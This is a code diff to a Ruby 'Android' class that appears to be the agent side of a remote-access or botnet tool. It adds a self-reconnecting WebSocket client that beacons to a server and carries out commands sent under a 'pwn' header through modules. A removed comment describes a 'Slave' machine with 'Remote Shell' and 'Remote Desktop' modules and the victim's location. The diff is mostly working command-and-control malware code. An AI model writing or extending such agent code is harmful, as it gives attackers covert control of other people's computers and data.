@@ -37,10 +37,63 @@ class Android
       },
       "trailer" => "this is andorid 21 test"
     }.to_json
-    #'{"header": "android", "payload": {"id": "1234", "type": "Slave", "name": "Android 22", "computer": "4tech-pc", "user": "verbatim", "os": "Linux", "ip": "192.168.1.2", "country": "Philippines", "city": "Minalin", "inators": [{"id": "1111", "name": "Remote Shell"}, {"id": "2222", "name": "Remote Desktop"}, {"id": "3333", "name": "Remote Hack"}]}, "trailer": "whoami"}'
   end
 
   def connect(server)
-    @inators.find { |inator| inator.name == "Socket"}.connect server
+    EM.run {
+      @ws = Faye::WebSocket::Client.new(server)
+
+      @ws.on :open do |event|
+        p [:open]
+        @ws.send(android)
+      end
+
+      @ws.on :message do |event|
+        p [:message, event.data]
+        begin
+          packet = JSON.parse(event.data)
+
+          header = packet['header']       # header
+          payload = packet['payload']     # payload
+          trailer = packet['trailer']     # trailer
+
+          if header == "pwn" then
+            inator = packet['payload']['inator']
+            data = packet['payload']['data']
+            log = trailer
+            input(inator, data, log)
+          else
+            #disconnect
+          end
+        rescue Exception => ex
+          puts ex
+        end
+      end
+
+      @ws.on :close do |event|
+        p [:close, event.code, event.reason]
+        @ws = nil
+        sleep 1
+        connect server
+      end
+    }
+  end
+
+  def disconnect
+    @ws.close
+  end
+
+  def input(inator, data, log)
+    inator = @inators.find { |i| i.id == inator }
+    inator.input(data, log)
+  end
+
+  def output(inator, data, log)
+    packet = {
+      "header" => "data",
+      "payload" => { "android" => @id, "inator" => inator, "data" => data },
+      "trailer" => log
+    }.to_json
+    @ws.send packet
   end
 end
